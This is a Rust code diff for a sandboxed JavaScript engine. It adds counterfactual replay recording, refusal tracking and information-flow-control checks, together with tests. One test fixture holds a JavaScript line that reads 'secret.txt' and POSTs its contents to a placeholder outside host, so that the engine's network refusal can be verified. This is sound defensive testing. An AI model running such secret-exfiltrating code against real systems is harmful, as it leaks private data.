@@ -2833,11 +2833,15 @@ mod engine {
         }
     }
 
-    /// Supplies only the exact next authenticated input to a speculative branch.
-    /// This is deliberately a provider with no live mechanisms, paired with a
-    /// normal recording recorder. The engine's exact-replay recorder contract
-    /// still requires exhaustion; only this separate counterfactual input source
-    /// may leave an original suffix unused.
+    /// Supplies only the exact next authenticated input to a speculative branch
+    /// and observes its native recording boundary. Recording mode always returns
+    /// `None`: ordinary requests must enter this provider, while engine-owned IFC
+    /// refusals must be recorded without provider admission. Supplying a captured
+    /// refusal to a provider request would conceal a different native decision.
+    ///
+    /// Each accepted record advances the same bounded prefix. The engine's
+    /// exact-replay recorder still requires exhaustion; this separate recording
+    /// observer may leave an explicitly reported original suffix unused.
     struct CounterfactualHostIo {
         entries: Vec<(HostIoRequest, HostIoOutcome)>,
         state: Mutex<CounterfactualHostIoState>,
@@ -2847,6 +2851,31 @@ mod engine {
     struct CounterfactualHostIoState {
         consumed: usize,
         refusal: Option<&'static str>,
+        execution: CounterfactualExecutionState,
+        pending: Option<CounterfactualInputOrigin>,
+    }
+
+    #[derive(Clone, Copy, Default, PartialEq, Eq)]
+    enum CounterfactualExecutionState {
+        #[default]
+        Idle,
+        Active,
+        Finalized,
+    }
+
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum CounterfactualInputOrigin {
+        AwaitingOrigin,
+        ProviderReturned,
+    }
+
+    impl CounterfactualHostIoState {
+        fn refuse(&mut self, reason: &'static str) -> HostIoError {
+            let reason = *self.refusal.get_or_insert(reason);
+            HostIoError::Denied {
+                reason: reason.to_string(),
+            }
+        }
     }
 
     impl std::fmt::Debug for CounterfactualHostIo {
@@ -2867,25 +2896,136 @@ mod engine {
         }
 
         fn refuse(&self, reason: &'static str) -> HostIoError {
-            let mut state = self.state.lock().expect("counterfactual input state mutex");
-            let reason = *state.refusal.get_or_insert(reason);
+            match self.state.lock() {
+                Ok(mut state) => state.refuse(reason),
+                Err(_) => Self::unavailable(),
+            }
+        }
+
+        fn unavailable() -> HostIoError {
             HostIoError::Denied {
-                reason: reason.to_string(),
+                reason: "native counterfactual input state is unavailable".to_string(),
             }
         }
 
         fn verify(&self, observed: &[(HostIoRequest, HostIoOutcome)]) -> Result<usize, String> {
-            let state = self.state.lock().expect("counterfactual input state mutex");
+            let mut state = self
+                .state
+                .lock()
+                .map_err(|_| "native counterfactual input state is unavailable".to_string())?;
             if let Some(reason) = state.refusal {
                 return Err(reason.to_string());
             }
+            if state.execution != CounterfactualExecutionState::Finalized || state.pending.is_some()
+            {
+                let reason = "native counterfactual input observation was not finalized";
+                state.refuse(reason);
+                return Err(reason.to_string());
+            }
             if observed != &self.entries[..state.consumed] {
-                return Err(
-                    "native counterfactual effect evidence differs from its consumed captured-input prefix"
-                        .to_string(),
-                );
+                let reason = "native counterfactual effect evidence differs from its consumed captured-input prefix";
+                state.refuse(reason);
+                return Err(reason.to_string());
             }
             Ok(state.consumed)
+        }
+    }
+
+    impl HostIoRecorder for CounterfactualHostIo {
+        fn filesystem_exception_provenance(&self) -> HostIoExceptionProvenance {
+            HostIoExceptionProvenance::ProviderInternal
+        }
+
+        fn begin_execution(&self) -> Result<(), HostIoError> {
+            let mut state = self.state.lock().map_err(|_| Self::unavailable())?;
+            if let Some(reason) = state.refusal {
+                return Err(state.refuse(reason));
+            }
+            if state.execution != CounterfactualExecutionState::Idle {
+                return Err(state.refuse("native counterfactual inputs are single-execution"));
+            }
+            state.execution = CounterfactualExecutionState::Active;
+            Ok(())
+        }
+
+        fn replay(&self, request: &HostIoRequest) -> Option<HostIoOutcome> {
+            let Ok(mut state) = self.state.lock() else {
+                return Some(Err(Self::unavailable()));
+            };
+            if let Some(reason) = state.refusal {
+                return Some(Err(state.refuse(reason)));
+            }
+            if state.execution != CounterfactualExecutionState::Active || state.pending.is_some() {
+                return Some(Err(state.refuse(
+                    "native counterfactual request has no exclusive active recording boundary",
+                )));
+            }
+            let Some((expected, _)) = self.entries.get(state.consumed) else {
+                return Some(Err(
+                    state.refuse("native counterfactual requires an uncaptured host input")
+                ));
+            };
+            if expected != request {
+                return Some(Err(state.refuse(
+                    "native counterfactual host request differs from the next captured input",
+                )));
+            }
+            state.pending = Some(CounterfactualInputOrigin::AwaitingOrigin);
+            None
+        }
+
+        fn record(&self, request: &HostIoRequest, outcome: &HostIoOutcome) {
+            let Ok(mut state) = self.state.lock() else {
+                return;
+            };
+            if state.refusal.is_some() {
+                return;
+            }
+            if state.execution != CounterfactualExecutionState::Active {
+                state.refuse("native counterfactual recorded outside its active execution");
+                return;
+            }
+            let Some((expected_request, expected_outcome)) = self.entries.get(state.consumed)
+            else {
+                state.refuse("native counterfactual recorded an uncaptured host input");
+                return;
+            };
+            if expected_request != request || expected_outcome != outcome {
+                state.refuse("native counterfactual recorded a different request or outcome");
+                return;
+            }
+            let required_origin = if is_engine_network_refusal(request, outcome) {
+                CounterfactualInputOrigin::AwaitingOrigin
+            } else {
+                CounterfactualInputOrigin::ProviderReturned
+            };
+            if state.pending != Some(required_origin) {
+                state.refuse("native counterfactual input has a different native origin");
+                return;
+            }
+            state.consumed += 1;
+            state.pending = None;
+        }
+
+        fn finish_execution(&self) -> Result<Vec<(HostIoRequest, HostIoOutcome)>, HostIoError> {
+            let mut state = self.state.lock().map_err(|_| Self::unavailable())?;
+            if let Some(reason) = state.refusal {
+                return Err(state.refuse(reason));
+            }
+            if state.execution != CounterfactualExecutionState::Active || state.pending.is_some() {
+                return Err(state.refuse(
+                    "native counterfactual execution has an incomplete recording boundary",
+                ));
+            }
+            state.execution = CounterfactualExecutionState::Finalized;
+            Ok(self.entries[..state.consumed].to_vec())
+        }
+
+        fn recorded_entries(&self) -> Vec<(HostIoRequest, HostIoOutcome)> {
+            self.state.lock().map_or_else(
+                |_| Vec::new(),
+                |state| self.entries[..state.consumed].to_vec(),
+            )
         }
     }
 
@@ -2899,35 +3039,39 @@ mod engine {
         }
 
         fn perform(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
-            let mut state = self.state.lock().expect("counterfactual input state mutex");
+            let mut state = self.state.lock().map_err(|_| Self::unavailable())?;
             if let Some(reason) = state.refusal {
-                return Err(HostIoError::Denied {
-                    reason: reason.to_string(),
-                });
+                return Err(state.refuse(reason));
+            }
+            if state.execution != CounterfactualExecutionState::Active
+                || state.pending != Some(CounterfactualInputOrigin::AwaitingOrigin)
+            {
+                return Err(
+                    state.refuse("native counterfactual provider has no exclusive pending request")
+                );
             }
             if !granted.contains(&request.required_capability()) {
-                state.refusal =
-                    Some("native counterfactual input request exceeds the attenuated capabilities");
+                state.refuse(
+                    "native counterfactual input request exceeds the attenuated capabilities",
+                );
                 return Err(HostIoError::CapabilityMissing {
                     capability: request.required_capability(),
                 });
             }
             let Some((expected_request, outcome)) = self.entries.get(state.consumed) else {
-                let reason = "native counterfactual requires an uncaptured host input";
-                state.refusal = Some(reason);
-                return Err(HostIoError::Denied {
-                    reason: reason.to_string(),
-                });
+                return Err(state.refuse("native counterfactual requires an uncaptured host input"));
             };
             if expected_request != request {
-                let reason =
-                    "native counterfactual host request differs from the next captured input";
-                state.refusal = Some(reason);
-                return Err(HostIoError::Denied {
-                    reason: reason.to_string(),
-                });
+                return Err(state.refuse(
+                    "native counterfactual host request differs from the next captured input",
+                ));
             }
-            state.consumed += 1;
+            if is_engine_network_refusal(request, outcome) {
+                return Err(state.refuse(
+                    "native counterfactual must independently regenerate the engine network refusal",
+                ));
+            }
+            state.pending = Some(CounterfactualInputOrigin::ProviderReturned);
             outcome.clone()
         }
 
@@ -4045,10 +4189,7 @@ mod engine {
                 let inputs = Arc::new(CounterfactualHostIo::new(
                     payload.host_effect_transcript.clone(),
                 ));
-                orchestrator.set_host_io(
-                    inputs.clone(),
-                    Some(Arc::new(InMemoryHostIoTranscript::recording())),
-                );
+                orchestrator.set_host_io(inputs.clone(), Some(inputs.clone()));
                 let exec_result = if uses_closed_world_lowering_only_builtins {
                     let mut delivered = package.clone();
                     delivered.source = entry.module.record.source.clone();
@@ -4814,54 +4955,200 @@ mod engine {
                 (first.clone(), first_outcome.clone()),
                 (second.clone(), second_outcome.clone()),
             ];
+            let empty = CounterfactualHostIo::new(entries.clone());
+            empty.begin_execution().unwrap();
+            assert!(empty.finish_execution().unwrap().is_empty());
+            assert_eq!(empty.verify(&[]).unwrap(), 0);
+
             let prefix = CounterfactualHostIo::new(entries.clone());
-            assert_eq!(prefix.verify(&[]).unwrap(), 0);
+            prefix.begin_execution().unwrap();
+            assert!(prefix.replay(&first).is_none());
             assert_eq!(
                 prefix.perform(&first, &[HostIoCapability::FsRead]),
                 first_outcome
             );
+            prefix.record(&first, &first_outcome);
+            assert_eq!(prefix.finish_execution().unwrap(), entries[..1]);
             assert_eq!(prefix.verify(&entries[..1]).unwrap(), 1);
             assert!(
                 prefix.verify(&entries).is_err(),
                 "unused input is not an observed effect"
             );
+            assert!(prefix.verify(&entries[..1]).is_err());
             let diagnostic = format!("{prefix:?}");
             assert!(!diagnostic.contains("private"));
 
             // A skipped/reordered input never searches ahead, and ignoring its
             // error cannot allow a later matching request to repair the branch.
             let reordered = CounterfactualHostIo::new(entries.clone());
-            assert!(
-                reordered
-                    .perform(&second, &[HostIoCapability::FsRead])
-                    .is_err()
-            );
+            reordered.begin_execution().unwrap();
+            assert!(matches!(reordered.replay(&second), Some(Err(_))));
+            assert!(matches!(reordered.replay(&first), Some(Err(_))));
             assert!(
                 reordered
                     .perform(&first, &[HostIoCapability::FsRead])
                     .is_err()
             );
+            assert!(reordered.finish_execution().is_err());
             assert!(reordered.verify(&[]).is_err());
 
             let exhausted = CounterfactualHostIo::new(entries[..1].to_vec());
+            exhausted.begin_execution().unwrap();
+            assert!(exhausted.replay(&first).is_none());
             assert_eq!(
                 exhausted.perform(&first, &[HostIoCapability::FsRead]),
                 first_outcome
             );
+            exhausted.record(&first, &first_outcome);
+            assert!(matches!(exhausted.replay(&second), Some(Err(_))));
             assert!(
                 exhausted
                     .perform(&second, &[HostIoCapability::FsRead])
                     .is_err()
             );
+            assert!(exhausted.finish_execution().is_err());
             assert!(exhausted.verify(&entries[..1]).is_err());
 
             let denied = CounterfactualHostIo::new(entries);
+            denied.begin_execution().unwrap();
+            assert!(denied.replay(&first).is_none());
             assert!(matches!(
                 denied.perform(&first, &[]),
                 Err(HostIoError::CapabilityMissing { .. })
             ));
             assert!(denied.perform(&first, &[HostIoCapability::FsRead]).is_err());
+            assert!(denied.finish_execution().is_err());
             assert!(denied.verify(&[]).is_err());
+        }
+
+        #[test]
+        fn native_counterfactual_records_engine_refusals_and_later_provider_inputs_in_order() {
+            let refused = deferred_network_request("outside-publisher.example.test:443");
+            let read = HostIoRequest::FsRead {
+                path: "after-refusal.txt".into(),
+            };
+            let read_outcome = Ok(HostIoResponse::FsRead {
+                bytes: b"captured-followup".to_vec(),
+            });
+            let entries = vec![
+                (refused.clone(), engine_network_refusal()),
+                (read.clone(), read_outcome.clone()),
+                (refused.clone(), engine_network_refusal()),
+                (read.clone(), read_outcome.clone()),
+            ];
+            let inputs = CounterfactualHostIo::new(entries.clone());
+            inputs.begin_execution().unwrap();
+            assert!(inputs.replay(&refused).is_none());
+            inputs.record(&refused, &engine_network_refusal());
+            assert!(inputs.replay(&read).is_none());
+            assert_eq!(
+                inputs.perform(&read, &[HostIoCapability::FsRead]),
+                read_outcome
+            );
+            inputs.record(&read, &read_outcome);
+            assert!(inputs.replay(&refused).is_none());
+            inputs.record(&refused, &engine_network_refusal());
+            assert_eq!(inputs.finish_execution().unwrap(), entries[..3]);
+            assert_eq!(inputs.verify(&entries[..3]).unwrap(), 3);
+            assert_eq!(inputs.recorded_entries(), entries[..3]);
+            assert!(inputs.finish_execution().is_err());
+            assert!(inputs.verify(&entries[..3]).is_err());
+            assert!(inputs.begin_execution().is_err());
+        }
+
+        #[test]
+        fn native_counterfactual_provider_cannot_supply_an_engine_refusal_or_repair_divergence() {
+            let request = deferred_network_request("api.example.test:443");
+            let inputs =
+                CounterfactualHostIo::new(vec![(request.clone(), engine_network_refusal())]);
+            inputs.begin_execution().unwrap();
+            assert!(inputs.replay(&request).is_none());
+            let provider_error = inputs.perform(&request, &[HostIoCapability::NetworkSend]);
+            assert!(provider_error.is_err());
+            assert_ne!(provider_error, engine_network_refusal());
+            inputs.record(&request, &provider_error);
+            // Neither suppressing the provider error nor later presenting the
+            // expected refusal can change the origin of the failed attempt.
+            assert!(matches!(inputs.replay(&request), Some(Err(_))));
+            inputs.record(&request, &engine_network_refusal());
+            assert!(inputs.finish_execution().is_err());
+            assert!(inputs.verify(&[]).is_err());
+            assert!(inputs.begin_execution().is_err());
+        }
+
+        #[test]
+        fn native_counterfactual_recording_refuses_missing_changed_and_unpaired_observations() {
+            let request = deferred_network_request("api.example.test:443");
+            for mutation in [
+                "missing-record",
+                "changed-request",
+                "changed-outcome",
+                "duplicate-replay",
+                "unrequested-record",
+                "unrequested-provider",
+            ] {
+                let inputs =
+                    CounterfactualHostIo::new(vec![(request.clone(), engine_network_refusal())]);
+                inputs.begin_execution().unwrap();
+                match mutation {
+                    "unrequested-record" => inputs.record(&request, &engine_network_refusal()),
+                    "unrequested-provider" => {
+                        assert!(
+                            inputs
+                                .perform(&request, &[HostIoCapability::NetworkSend])
+                                .is_err()
+                        );
+                    }
+                    _ => {
+                        assert!(inputs.replay(&request).is_none());
+                        match mutation {
+                            "changed-request" => inputs.record(
+                                &deferred_network_request("changed.example.test:443"),
+                                &engine_network_refusal(),
+                            ),
+                            "changed-outcome" => inputs.record(
+                                &request,
+                                &Err(HostIoError::Denied {
+                                    reason: "FLOW_POLICY_BLOCKED: lookalike".into(),
+                                }),
+                            ),
+                            "duplicate-replay" => {
+                                assert!(matches!(inputs.replay(&request), Some(Err(_))));
+                                inputs.record(&request, &engine_network_refusal());
+                            }
+                            "missing-record" => {}
+                            _ => unreachable!("listed mutation"),
+                        }
+                    }
+                }
+                assert!(inputs.finish_execution().is_err(), "{mutation}");
+                assert!(inputs.verify(&[]).is_err(), "{mutation}");
+                assert!(inputs.begin_execution().is_err(), "{mutation}");
+            }
+
+            let read = HostIoRequest::FsRead {
+                path: "input.txt".into(),
+            };
+            let outcome = Ok(HostIoResponse::FsRead {
+                bytes: b"input".to_vec(),
+            });
+            let inputs = CounterfactualHostIo::new(vec![(read.clone(), outcome.clone())]);
+            inputs.begin_execution().unwrap();
+            assert!(inputs.replay(&read).is_none());
+            inputs.record(&read, &outcome);
+            assert!(
+                inputs.finish_execution().is_err(),
+                "ordinary inputs require provider admission"
+            );
+            assert!(inputs.verify(&[]).is_err());
+
+            let inputs =
+                CounterfactualHostIo::new(vec![(request.clone(), engine_network_refusal())]);
+            assert!(matches!(inputs.replay(&request), Some(Err(_))));
+            assert!(
+                inputs.begin_execution().is_err(),
+                "pre-begin access is sticky"
+            );
         }
 
         #[test]
@@ -5091,6 +5378,174 @@ mod engine {
                     "captured-before-write"
                 );
                 assert!(reexecute(&capture).unwrap().satisfies_policy_equivalence());
+            });
+        }
+
+        #[cfg(unix)]
+        #[test]
+        fn native_counterfactual_regenerates_ifc_and_continues_with_captured_inputs() {
+            on_native_stack(|| {
+                let workspace = tempfile::tempdir().unwrap();
+                let original = workspace.path().join("original");
+                std::fs::create_dir(&original).unwrap();
+                std::fs::write(original.join("secret.txt"), "private-input").unwrap();
+                std::fs::write(original.join("followup.txt"), "captured-followup").unwrap();
+                let mut ceiling = scoped_ceiling();
+                ceiling.max_calls_per_epoch.insert("fs_read".into(), 2);
+                ceiling
+                    .max_calls_per_epoch
+                    .insert("network_egress".into(), 0);
+                let provider = Arc::new(ScopedNetworkFixture {
+                    filesystem: SandboxedHostIo::with_root(&original).unwrap(),
+                    authority: PublisherHostAuthority::new(ceiling.clone()).unwrap(),
+                    network_calls: std::sync::atomic::AtomicUsize::new(0),
+                });
+                let capture = record_frozen_execution(
+                    &original,
+                    "const fs = require('fs'); const http = require('http'); const body = fs.readFileSync('secret.txt', 'utf8'); const request = http.request('https://outside-publisher.example.test/upload', { method: 'POST' }); request.on('error', () => {}); request.end(body); const after = fs.readFileSync('followup.txt', 'utf8'); console.log('after-ifc'); fs.writeFileSync('output.txt', after); console.log('after-write');",
+                    [
+                        "module_load", "fs_read", "fs_write", "network_egress", "env_read",
+                        "builtin", "timer",
+                    ]
+                    .into_iter()
+                    .map(str::to_string)
+                    .collect(),
+                    provider.clone(),
+                )
+                .with_capability_ceiling(&ceiling)
+                .unwrap();
+                let payload = decode_capture(&capture).unwrap();
+                assert_eq!(payload.host_effect_transcript.len(), 4);
+                assert!(is_engine_network_refusal(
+                    &payload.host_effect_transcript[1].0,
+                    &payload.host_effect_transcript[1].1,
+                ));
+                assert_eq!(provider.network_calls.load(Ordering::Relaxed), 0);
+                let archived = workspace.path().join("archived");
+                std::fs::rename(&original, &archived).unwrap();
+                std::fs::rename(
+                    archived.join("output.txt"),
+                    archived.join("retained-output.txt"),
+                )
+                .unwrap();
+
+                let completed = counterfactual(&capture, &["env_read".into()])
+                    .expect("the native branch regenerates IFC and continues after it");
+                assert!(completed.baseline.satisfies_policy_equivalence());
+                assert_eq!(
+                    completed.terminal_state,
+                    NativeReplayTerminalState::Completed
+                );
+                assert_eq!(completed.consumed_host_effects, 4);
+                assert_eq!(completed.unused_original_host_effects, 0);
+                assert!(completed.console_matches_original);
+                assert!(
+                    completed
+                        .console_output
+                        .iter()
+                        .any(|entry| entry.message == "after-write")
+                );
+                assert!(
+                    !completed
+                        .retained_declared_capabilities
+                        .iter()
+                        .any(|tag| tag == "env_read")
+                );
+                assert!(!completed.replay_certified && !completed.policy_equivalence_certified);
+
+                let stopped = counterfactual(&capture, &["fs_write".into()])
+                    .expect("a restricted branch may stop after its regenerated refusal");
+                assert!(stopped.baseline.satisfies_policy_equivalence());
+                assert_eq!(
+                    stopped.terminal_state,
+                    NativeReplayTerminalState::EngineFailure
+                );
+                assert_eq!(stopped.consumed_host_effects, 3);
+                assert_eq!(stopped.unused_original_host_effects, 1);
+                assert!(
+                    stopped
+                        .console_output
+                        .iter()
+                        .any(|entry| entry.message == "after-ifc")
+                );
+                assert!(
+                    !stopped
+                        .console_output
+                        .iter()
+                        .any(|entry| entry.message == "after-write")
+                );
+                assert!(!stopped.replay_certified && !stopped.policy_equivalence_certified);
+                assert_eq!(provider.network_calls.load(Ordering::Relaxed), 0);
+                assert!(!original.exists());
+                assert!(!archived.join("output.txt").exists());
+                assert_eq!(
+                    std::fs::read_to_string(archived.join("retained-output.txt")).unwrap(),
+                    "captured-followup"
+                );
+            });
+        }
+
+        #[cfg(unix)]
+        #[test]
+        fn native_counterfactual_refuses_provider_origin_flow_marker_after_verified_baseline() {
+            #[derive(Debug, Default)]
+            struct MarkerProvider {
+                calls: std::sync::atomic::AtomicUsize,
+            }
+
+            impl HostIoProvider for MarkerProvider {
+                fn name(&self) -> &str {
+                    "provider-origin-flow-marker-negative-control"
+                }
+
+                fn filesystem_exception_provenance(&self) -> HostIoExceptionProvenance {
+                    HostIoExceptionProvenance::ProviderInternal
+                }
+
+                fn perform(
+                    &self,
+                    request: &HostIoRequest,
+                    granted: &[HostIoCapability],
+                ) -> HostIoOutcome {
+                    assert!(matches!(request, HostIoRequest::NetworkRequest { .. }));
+                    assert!(granted.contains(&HostIoCapability::NetworkSend));
+                    self.calls.fetch_add(1, Ordering::Relaxed);
+                    engine_network_refusal()
+                }
+            }
+
+            on_native_stack(|| {
+                let original = tempfile::tempdir().unwrap();
+                let provider = Arc::new(MarkerProvider::default());
+                // The public literal reaches a real provider invocation, which
+                // supplies a lookalike marker. This is deliberately not the
+                // native IFC path. Historical unscoped replay can reproduce the
+                // recorded outcome, but that is no authority for the branch to
+                // treat it as an independently regenerated native refusal.
+                let capture = record_frozen_execution(
+                    original.path(),
+                    "const http = require('http'); const request = http.request('https://api.example.test/upload', { method: 'POST' }); request.on('error', () => {}); request.end('public-input'); console.log('after-request');",
+                    [
+                        "module_load",
+                        "network_egress",
+                        "env_read",
+                        "builtin",
+                        "timer",
+                    ]
+                    .into_iter()
+                    .map(str::to_string)
+                    .collect(),
+                    provider.clone(),
+                );
+                assert_eq!(provider.calls.load(Ordering::Relaxed), 1);
+                assert!(reexecute(&capture).unwrap().satisfies_policy_equivalence());
+                let error = counterfactual(&capture, &["env_read".into()])
+                    .expect_err("a native branch cannot consume a refusal through its provider");
+                assert!(
+                    error.contains("no certified terminal observation"),
+                    "{error}"
+                );
+                assert_eq!(provider.calls.load(Ordering::Relaxed), 1);
             });
         }
 
